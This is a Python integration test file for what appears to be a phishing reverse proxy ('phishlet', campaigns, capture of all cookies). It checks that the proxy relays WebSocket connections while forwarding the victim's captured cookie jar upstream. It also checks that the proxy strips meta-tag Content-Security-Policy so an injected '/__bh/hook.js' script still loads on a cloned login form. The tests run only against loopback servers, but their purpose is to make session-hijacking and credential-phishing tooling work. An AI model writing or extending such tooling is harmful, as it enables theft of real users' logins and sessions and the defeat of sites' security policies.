"""WebSocket relay and meta-tag CSP handling.

The proxy had no WebSocket support at all, so any site whose flow opens a socket
froze at the handshake. The relay is verified against a real socket server on
loopback: the handshake must reach the upstream WITH the victim's cookie jar, the
client must see the 101, and bytes must flow both ways.

The same file covers a policy delivered as `<meta http-equiv=...>`, which the
response-header handling never touched.
"""
import base64
import hashlib
import http.client
import http.server
import os
import re
import socket
import socketserver
import sys
import threading
import time

import pytest

HERE = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, HERE)

pytestmark = pytest.mark.integration

WS_MAGIC = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"

PAGE = ('<!doctype html><html><head>'
        '<meta http-equiv="Content-Security-Policy" '
        'content="default-src \'self\'; script-src \'self\'">'
        '<meta http-equiv="X-Content-Security-Policy" content="default-src \'none\'">'
        '</head><body><form action="/login"><input name="username">'
        '<input name="password" type="password"></form></body></html>')


class WsEcho(socketserver.ThreadingTCPServer):
    allow_reuse_address = True

    def __init__(self):
        super().__init__(("127.0.0.1", 0), WsEchoHandler)
        self.handshakes = []


class WsEchoHandler(socketserver.BaseRequestHandler):
    """A socket server: accept the upgrade, then echo everything."""

    def handle(self):
        data = b""
        self.request.settimeout(10)
        while b"\r\n\r\n" not in data and len(data) < 65536:
            chunk = self.request.recv(4096)
            if not chunk:
                return
            data += chunk
        head = data.split(b"\r\n\r\n")[0].decode("latin-1", "replace")
        if "upgrade: websocket" not in head.lower():
            # a plain request must NOT get a 101: this server only speaks WebSocket
            body = b"websocket endpoint"
            self.request.sendall(
                (f"HTTP/1.1 400 Bad Request\r\nContent-Type: text/plain\r\n"
                 f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
                 ).encode() + body)
            return
        self.server.handshakes.append(head)
        key = ""
        for line in head.splitlines():
            if line.lower().startswith("sec-websocket-key:"):
                key = line.split(":", 1)[1].strip()
        accept = base64.b64encode(
            hashlib.sha1((key + WS_MAGIC).encode()).digest()).decode()
        self.request.sendall(
            ("HTTP/1.1 101 Switching Protocols\r\n"
             "Upgrade: websocket\r\nConnection: Upgrade\r\n"
             f"Sec-WebSocket-Accept: {accept}\r\n\r\n").encode())
        leftovers = data.split(b"\r\n\r\n", 1)[1]
        if leftovers:
            self.request.sendall(leftovers)
        try:
            while True:
                chunk = self.request.recv(4096)
                if not chunk:
                    break
                self.request.sendall(chunk)          # echo, unchanged
        except Exception:
            pass


class PolicyPage(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, *a):
        pass

    def do_GET(self):
        body = PAGE.encode()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


def free_port():
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _proxy_for(up_port, scheme="http"):
    from core.phishlet import Phishlet, ProxyHost
    from core.proxy import ProxyEngine, serve_proxy
    ph = Phishlet(capture_cookies=["*"], inject_paths=[".*"], verify_tls=False)
    ph.proxy_hosts = [ProxyHost(domain="127.0.0.1", orig_sub="", phish_sub="",
                               scheme=scheme, port=up_port, is_landing=True)]
    engine = ProxyEngine(ph, db=None, geo_provider="off", logger=lambda *a: None)
    port = free_port()
    httpd = serve_proxy(engine, port, campaign="ws-test")
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.3)
    return engine, httpd, port


class TestWebSocketRelay:

    def test_the_socket_is_relayed_and_echoes(self):
        srv = WsEcho()
        up_port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        engine, httpd, port = _proxy_for(up_port)
        try:
            key = base64.b64encode(b"x" * 16).decode()
            sock = socket.create_connection(("127.0.0.1", port), timeout=10)
            sock.sendall(
                (f"GET /socket HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
                 f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
                 f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
                 ).encode())
            head = b""
            while b"\r\n\r\n" not in head:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                head += chunk
            assert b"101" in head.split(b"\r\n")[0], head[:200]
            assert b"Sec-WebSocket-Accept" in head, head[:300]

            # bytes must flow both ways
            sock.sendall(b"hello-socket")
            got = sock.recv(4096)
            assert got == b"hello-socket", got
            sock.close()
        finally:
            httpd.shutdown()
            srv.shutdown()

    def test_the_upstream_handshake_carries_the_victims_cookies(self):
        """The socket has to be authorised the way the real page would be: the
        victim's upstream cookie jar must reach the handshake."""
        srv = WsEcho()
        up_port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        engine, httpd, port = _proxy_for(up_port)
        try:
            # seed the session and its upstream jar directly: this upstream speaks
            # only WebSocket, so there is no HTML page to fetch first
            sid = "a1" * 16
            sess = engine.session(sid, ip="127.0.0.1", ua="Mozilla/5.0")
            sess.note_cookies(engine.phishlet, ["auth=TOKEN123; Path=/"],
                              host="127.0.0.1")
            assert any(c.name == "auth" for c in sess.cookies), \
                [(c.name, c.domain) for c in sess.cookies]

            key = base64.b64encode(b"y" * 16).decode()
            sock = socket.create_connection(("127.0.0.1", port), timeout=10)
            sock.sendall(
                (f"GET /socket HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\n"
                 f"Cookie: __bhs={sid}\r\nUpgrade: websocket\r\n"
                 f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
                 f"Sec-WebSocket-Version: 13\r\n\r\n").encode())
            head = b""
            while b"\r\n\r\n" not in head:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                head += chunk
            sock.close()
            assert b"101" in head.split(b"\r\n")[0], head[:200]
            assert srv.handshakes, "the upstream never saw a handshake"
            saw = srv.handshakes[0]
            assert "auth=TOKEN123" in saw, saw
            assert "origin: http://127.0.0.1" in saw.lower(), saw
        finally:
            httpd.shutdown()
            srv.shutdown()

    def test_a_normal_get_still_takes_the_html_path(self):
        srv = WsEcho()                      # answers no HTML, so expect a failure
        up_port = srv.server_address[1]
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        engine, httpd, port = _proxy_for(up_port)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=6)
            try:
                conn.request("GET", "/login", headers={"Host": "127.0.0.1"})
                r = conn.getresponse()
                r.read()
                status = r.status
            except Exception:
                status = 502
            assert status in (200, 400, 502), status
            conn.close()
        finally:
            httpd.shutdown()
            srv.shutdown()


class TestMetaPolicy:

    def test_a_meta_csp_is_removed_and_the_hook_still_loads(self):
        up = socketserver.ThreadingTCPServer(("127.0.0.1", 0), PolicyPage)
        up.daemon_threads = True
        up_port = up.server_address[1]
        threading.Thread(target=up.serve_forever, daemon=True).start()
        engine, httpd, port = _proxy_for(up_port)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
            conn.request("GET", "/login", headers={"Host": "127.0.0.1"})
            r = conn.getresponse()
            body = r.read().decode("utf-8", "replace")
            headers = dict(r.getheaders())
            conn.close()
            assert "content-security-policy" not in {k.lower() for k in headers}, headers
            assert not re.search(r"http-equiv\s*=\s*[\"']?content-security-policy",
                                 body, re.I), body[:400]
            assert not re.search(r"x-content-security-policy", body, re.I), body[:400]
            assert "/__bh/hook.js" in body or engine.path_of("/__bh/hook.js") in body
        finally:
            httpd.shutdown()
            up.shutdown()
